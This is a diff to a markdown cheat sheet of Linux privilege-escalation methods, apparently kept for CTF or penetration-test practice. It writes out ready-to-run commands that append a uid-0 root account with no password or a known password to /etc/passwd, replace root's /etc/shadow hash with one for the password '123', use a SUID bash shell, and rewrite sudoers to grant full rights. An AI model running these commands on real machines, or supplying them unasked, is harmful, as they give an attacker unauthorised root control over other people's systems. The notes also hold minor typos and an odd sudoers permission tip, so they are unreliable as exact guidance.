@@ -79,16 +79,21 @@ chmod +s /bin/bash
 > 1. check the **SUID** bit set on **/bin/bash**.
 > 1. ```bash /bin/bash -p ``` (you shoud be **root**).
 
-#### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
+#### PrivESC Methodology for Linux - /etc/passwd 
 > 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
 > 1. Making user **fm** the root by typing command ->  echo fm::0:0:root:/root:/bin/bash >> /etc/passwd
 > 1. openssl for generating password hashes command -> openssl passwd -1
-> 1. username:password === skinny1:123 ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
+> 1. username:password === **skinny1:123** ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
+
+#### PrivESC Methodology for Linux - /etc/shadow
+> 1. **/etc/shadow** ADD this entry (password===**123**) $6$IIIDY9Qfqb8kaEoT$x31QacmGJzff27wPu2FdxRWDYcDK4nGCGGMauoVcU3MqnvQWvpdoUQsMJEk2KrG4H8TbeCOVxHPVgVvHCFAR3/
+> 1. Orignal ```root:$6$fxS/o9DNpawvWAzM$Mary1W5dFiICVWi3dmGL4nXbnMT782p/5d3m3VFaCW1LX3EdLKj4OTXDEZA.ntOHIhWYHxeD4KxmvkNHMMlAq0:18825:0:99999:7:::```
+> 1. Modified ```root:$6$IIIDY9Qfqb8kaEoT$x31QacmGJzff27wPu2FdxRWDYcDK4nGCGGMauoVcU3MqnvQWvpdoUQsMJEk2KrG4H8TbeCOVxHPVgVvHCFAR3/:18825:0:99999:7:::```
 
 #### PrivESC Methodology for Linux - /etc/sudoers
 > 1. john ALL=(root) /usr/bin/python3 /home/john/file.py #Orignal Command
 > 1. john ALL=(ALL:ALL) ALL #Modified for PrivESC
-> 1. make sure /etc/sudoers is not world writeable by running ```sudo chmod 0555 /etc/sudoers```
+> 1. make sure /etc/sudoers is has correct permsissions by running ```sudo chmod 0555 /etc/sudoers```
 
 
 #### Pivoting crap - MSF, socks4a and proxychains
